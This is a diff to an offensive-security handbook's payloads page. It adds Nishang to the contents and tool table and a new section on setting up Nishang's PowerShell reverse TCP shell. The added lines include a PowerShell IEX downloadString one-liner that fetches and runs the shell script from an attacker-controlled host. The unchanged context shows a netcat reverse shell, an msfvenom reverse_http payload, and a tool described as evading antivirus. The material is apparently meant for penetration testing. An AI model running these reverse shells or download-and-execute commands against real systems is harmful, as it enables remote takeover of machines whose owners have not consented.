@@ -17,6 +17,7 @@
 - [mkfifo Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#mkfifo-Reverse-Shell)
 - [msfvenom](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#msfvenom)
 - [Netcat Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Netcat-Reverse-Shell)
+- [Nishang](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Nishang)
 - [PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PDF)
 - [Perl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Perl-Reverse-Shell)
 - [PHP Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-Web-Shell)
@@ -41,6 +42,7 @@
 | hoaxshell | An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic. | https://github.com/t3l3machus/hoaxshell |
 | Intruder Payloads | A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists. | https://github.com/1N3/IntruderPayloads |
 | marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
+| Nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
 | Payload Box | Payload Collection | https://github.com/payloadbox |
 | PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
@@ -237,6 +239,30 @@ $ msfvenom -p windows/meterpreter/reverse_http LHOST=<LHOST> LPORT=<LPORT> HttpU
 
 ```c
 $ nc -e /bin/sh <LHOST> <LPORT>
+```
+
+## Nishang
+
+> https://github.com/samratashok/nishang
+
+### Reverse-TCP Shell for Windows
+
+```c
+$ cd PATH/TO/nishang/Shells/
+$ cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
+```
+
+Choose which variant you require, copy and put it at the end of the file.
+
+```c
+tail -3 Invoke-PowerShellTcp.ps1 
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
+```
+
+```c
+C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 ```
 
 ## PDF
